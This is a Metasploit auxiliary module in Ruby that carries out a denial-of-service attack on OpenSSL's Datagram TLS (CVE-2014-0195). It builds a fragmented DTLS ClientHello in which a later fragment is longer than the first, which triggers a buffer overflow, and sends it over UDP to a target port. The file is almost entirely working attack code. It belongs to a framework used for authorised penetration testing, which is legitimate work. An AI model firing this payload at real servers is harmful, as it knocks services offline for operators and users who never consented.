##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'OpenSSL DTLS Fragment Buffer Overflow DoS',
      'Description' => %q{
        This module performs a Denial of Service Attack against Datagram TLS in
        OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
        This occurs when a DTLS ClientHello message has multiple fragments and the
        fragment lengths of later fragments are larger than that of the first, a
        buffer overflow occurs, causing a DoS.
      },
      'Author'  =>
        [
          'Juri Aedla <asd[at]ut.ee>', # Vulnerability discovery
          'Jon Hart <jon_hart[at]rapid7.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2014-0195'],
          ['ZDI', '14-173'],
          ['BID', '67900'],
          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002'],
          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Once-Bled-Twice-Shy-OpenSSL-CVE-2014-0195/ba-p/6501048']
        ],
      'DisclosureDate' => '2014-06-05'))

    register_options([
      Opt::RPORT(4433),
      OptInt.new('VERSION', [true,  "SSl/TLS version", 0xFEFF])
    ])

  end

  def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)
    # format is: type (1 byte), total length (3 bytes), sequence # (2 bytes),
    # fragment offset (3 bytes), fragment length (3 bytes), fragment body
    sol = (seq << 48) | (frag_offset << 24) | frag_length
    [
      (type << 24) | length,
      (sol >> 32),
      (sol & 0x00000000FFFFFFFF)
    ].pack("NNN") + frag_body
  end

  def build_tls_message(type, version, epoch, sequence, message)
    # format is: type (1 byte), version (2 bytes), epoch # (2 bytes),
    # sequence # (6 bytes) + message length (2 bytes), message body
    es = (epoch << 48) | sequence
    [
      type,
      version,
      (es >> 32),
      (es & 0x00000000FFFFFFFF),
      message.length
    ].pack("CnNNn") + message
  end

  def run
    # add a small fragment
    fragments = build_tls_fragment(1, 2, 0, 0, 1, 'C')
    # add a large fragment where the length is significantly larger than that of the first
    # TODO: you'll need to tweak the 2nd, 5th and 6th arguments to trigger the condition in some situations
    fragments << build_tls_fragment(1, 1234, 0, 0, 123, Rex::Text.rand_text_alpha(1234))
    message = build_tls_message(22, datastore['VERSION'], 0, 0, fragments)
    connect_udp
    print_status("#{rhost}:#{rport} - Sending fragmented DTLS client hello packet")
    udp_sock.put(message)
    disconnect_udp
  end
end
